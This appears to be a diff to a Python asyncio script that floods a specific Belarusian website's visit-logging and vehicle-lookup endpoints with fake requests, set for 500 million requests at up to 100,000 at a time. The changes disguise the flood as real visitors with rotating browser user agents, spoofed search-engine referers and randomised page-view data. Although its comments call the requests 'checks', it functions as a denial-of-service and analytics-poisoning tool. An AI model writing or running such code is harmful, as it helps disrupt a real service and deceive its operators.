@@ -8,51 +8,79 @@ from datetime import datetime, timezone
 
 import aiohttp
 
-# Список проверок: адрес + HTTP-метод + флаг ssl
+# Список проверок: эндпоинты из примера скрипта
 CHECKS = [
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True, "kind": "log_visit"},
+    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True, "kind": "vehicles_list"},
+    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True, "kind": "vehicles_list"},
+    {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
+    {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True, "kind": "vehicles_vin"},
 ]
 
 TOTAL_REQUESTS = 500000000
-DELAY_BETWEEN_REQ = 0.00001
-MAX_CONCURRENT = 1000
+DELAY_BETWEEN_REQ = 0.01
+MAX_CONCURRENT = 100000
 
 
 USER_AGENTS = [
-    (
-        f"Mozilla/5.0 ({''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
-        f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}) "
-        f"AppleWebKit/{''.join(random.choices(string.digits, k=3))}.0 "
-        f"(KHTML, like Gecko) Version/{random.randint(10, 19)}.0 "
-        f"Mobile/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))} "
-        f"Safari/{''.join(random.choices(string.digits, k=3))}.{''.join(random.choices(string.digits, k=1))}"
-    )
-    for _ in range(600)
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
+    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
+    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
 ]
 
 
-def build_payload(request_num: int, worker_id: int) -> dict:
+def build_payload(request_num: int, worker_id: int, check_cfg: dict) -> dict:
     iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
-    return {
+
+    base_payload = {
         "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
         "page": f"/probe/{uuid.uuid4().hex[:12]}",
         "timestamp": iso_string,
         "userAgent": random.choice(USER_AGENTS),
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "acceptLanguage": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]),
+        "acceptEncoding": "gzip, deflate, br",
+        "referer": random.choice(["https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/", "https://www.reddit.com/"]),
     }
+
+    if check_cfg["kind"] == "log_visit":
+        base_payload.update({
+            "pageName": random.choice(["Главная", "ЗТК", "Контейнер", "ПТО"]),
+            "event": "page_view",
+            "screenWidth": random.randint(360, 1920),
+            "screenHeight": random.randint(640, 1080),
+        })
+    elif check_cfg["kind"] == "vehicles_list":
+        base_payload.update({
+            "endpoint": "/api/vehicles",
+            "limit": 10,
+            "offset": random.randint(0, 100),
+        })
+    elif check_cfg["kind"] == "vehicles_vin":
+        base_payload.update({
+            "endpoint": "/api/vehicles",
+            "vin": random.choice(["W1K2060431R001488", "JTEBR3FJ20K191488", "WVWZZZ1JZ3W123456"]),
+        })
+
+    return base_payload
 
 
 request_counter = 0
@@ -72,7 +100,7 @@ async def worker(session, worker_id):
             current_request_num = request_counter
 
         check_cfg = CHECKS[(current_request_num - 1) % len(CHECKS)]
-        payload = build_payload(current_request_num, worker_id)
+        payload = build_payload(current_request_num, worker_id, check_cfg)
 
         try:
             start_time = time.time()
